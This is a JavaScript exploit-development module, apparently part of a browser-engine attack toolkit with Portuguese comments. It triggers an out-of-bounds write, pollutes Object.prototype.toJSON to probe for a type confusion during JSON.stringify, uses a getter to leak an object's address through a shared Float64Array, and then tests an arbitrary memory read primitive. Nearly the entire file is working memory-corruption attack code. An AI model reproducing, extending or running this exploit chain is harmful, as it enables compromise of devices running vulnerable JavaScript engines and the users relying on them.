// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R24)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read,  
    oob_write_absolute,
    isOOBReady // <<<< CORRIGIDO: Importação adicionada
} from '../core_exploit.mjs'; // Assumindo core_exploit.mjs (v31)

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 
const ARB_READ_TEST_ADDRESS_R24 = new AdvancedInt64(0x0, 0x2000); // Endereço de teste diferente para R24

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R24() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R24`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + arb_read Test (R24) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R24...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, 
        tc_probe_details: null, 
        stringifyResult: null,
        arb_read_test_result: { success: false, msg: "arb_read test (R24): Not run.", value_read: null, address_read: null },
        oob_value_used: null, 
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R24: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R24: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R24: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        function toJSON_TA_Probe_Iter_Closure_R24() { /* ... (lógica da sonda como na R23, apenas atualizando logs para R24) ... */ 
            probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
            const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
            logS3(`[PROBE_R24] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R24"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R24",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R24",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R24] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
            let lvf=NaN,lis="getter_err_r24";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R24] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
            return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
        } // Fim da sonda

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_arb_read_test_result = { success: false, msg: "arb_read test (R24): Not run.", value_read: null, address_read: null };
        let heisenbugConfirmedThisIter = false;
        
        try { 
            logS3(`  --- Fase 1 (R24): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R24,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R24: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R24: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                    if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                }else{logS3(` TC Probe R24: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
            logS3(`  --- Fase 1 (R24) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R24): Teste de arb_read ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter) { 
                try {
                    logS3(`  ArbRead Test: Chamando triggerOOB_primitive para arb_read...`, "info", FNAME_CURRENT_ITERATION);
                    await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-ArbReadSetup` });
                    // <<<< CORRIGIDO: Usa isOOBReady importado >>>>
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-ArbReadSetup`)) {
                        throw new Error("Ambiente OOB não pôde ser re-inicializado para teste de arb_read.");
                    }
                    logS3(`  ArbRead Test: Ambiente OOB pronto. Tentando ler de ${ARB_READ_TEST_ADDRESS_R24.toString(true)}...`, "info", FNAME_CURRENT_ITERATION);
                    
                    const read_value = await arb_read(ARB_READ_TEST_ADDRESS_R24, 8); 
                    
                    iter_arb_read_test_result.address_read = ARB_READ_TEST_ADDRESS_R24.toString(true);
                    if (isAdvancedInt64Object(read_value)) {
                        iter_arb_read_test_result.value_read = read_value.toString(true);
                        logS3(`  ArbRead Test: arb_read(${ARB_READ_TEST_ADDRESS_R24.toString(true)}, 8) -> ${read_value.toString(true)}`, "leak", FNAME_CURRENT_ITERATION);
                        iter_arb_read_test_result.success = true; 
                        iter_arb_read_test_result.msg = `arb_read executado. Lido: ${read_value.toString(true)}.`;
                    } else {
                        iter_arb_read_test_result.value_read = String(read_value);
                        iter_arb_read_test_result.msg = `arb_read retornou tipo inesperado: ${typeof read_value}. Val: ${String(read_value)}`;
                    }
                } catch (e_arb_read) {
                    iter_arb_read_test_result.msg = `ArbRead Test EXCEPTION: ${e_arb_read.message || String(e_arb_read)}`;
                    if (!iter_primary_error) iter_primary_error = e_arb_read;
                }
            } else { iter_arb_read_test_result.msg = "arb_read test: Pulado (TC Fase 1 falhou)."; }
            logS3(`  --- Fase 2 (R24) Concluída. arb_read Sucesso Operacional: ${iter_arb_read_test_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer;}finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear`});}

        final_probe_call_count_for_report = probe_call_count_iter;
        
        let current_iter_summary = { 
            oob_value:toHex(current_oob_value), error:iter_primary_error?(iter_primary_error.message||String(iter_primary_error)):null,
            tc_probe_details:iteration_final_tc_details_from_probe?JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)):null, 
            stringifyResult:iter_stringify_output_parsed,
            // Removendo campos de addrof específicos do getter/direct da TC da Fase 1, focando no arb_read
            arb_read_test_result_this_iter: iter_arb_read_test_result,
            heisenbug_on_M2_confirmed_by_tc_probe:heisenbugConfirmedThisIter 
        };
        iteration_results_summary.push(current_iter_summary);
        
        // Lógica ATUALIZADA para best_result_for_runner (R24)
        let tc_phase1_this_iter_success = heisenbugConfirmedThisIter;
        // Para R24, um "sucesso" de addrof é se o arb_read funcionou E leu algo diferente de zero.
        let arb_read_meaningful_success = iter_arb_read_test_result.success && iter_arb_read_test_result.value_read !== '0x00000000_00000000';

        if (arb_read_meaningful_success) { 
            if (!best_result_for_runner.arb_read_test_result?.success || best_result_for_runner.arb_read_test_result?.value_read === '0x00000000_00000000') {
                best_result_for_runner = { /* ... preenche com current_iter_summary, mas pegando os campos corretos ... */
                    errorOccurred: current_iter_summary.error, 
                    tc_probe_details: current_iter_summary.tc_probe_details, 
                    stringifyResult: current_iter_summary.stringifyResult,
                    arb_read_test_result: current_iter_summary.arb_read_test_result_this_iter,
                    oob_value_used: current_iter_summary.oob_value,
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_this_iter
                };
            }
        } else if (tc_phase1_this_iter_success && !best_result_for_runner.arb_read_test_result?.success) { 
            if (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used ) {
                 best_result_for_runner = { /* ... como acima ... */
                    errorOccurred: current_iter_summary.error, tc_probe_details: current_iter_summary.tc_probe_details, 
                    stringifyResult: current_iter_summary.stringifyResult, arb_read_test_result: current_iter_summary.arb_read_test_result_this_iter,
                    oob_value_used: current_iter_summary.oob_value, heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_this_iter
                 };
            }
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { /* ... como acima ... */ 
                errorOccurred: current_iter_summary.error, tc_probe_details: current_iter_summary.tc_probe_details, 
                stringifyResult: current_iter_summary.stringifyResult, arb_read_test_result: current_iter_summary.arb_read_test_result_this_iter,
                oob_value_used: current_iter_summary.oob_value, heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_this_iter
             };
        }
        
        if(arb_read_meaningful_success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R24: ArbRead OK!`;
        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R24: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R24: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R24): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
        errorOccurred:best_result_for_runner.errorOccurred, 
        tc_probe_details:best_result_for_runner.tc_probe_details, 
        stringifyResult:best_result_for_runner.stringifyResult, 
        arb_read_test_result: best_result_for_runner.arb_read_test_result, 
        iteration_results_summary:iteration_results_summary, 
        total_probe_calls_last_iter:final_probe_call_count_for_report,
        oob_value_of_best_result:best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result:best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
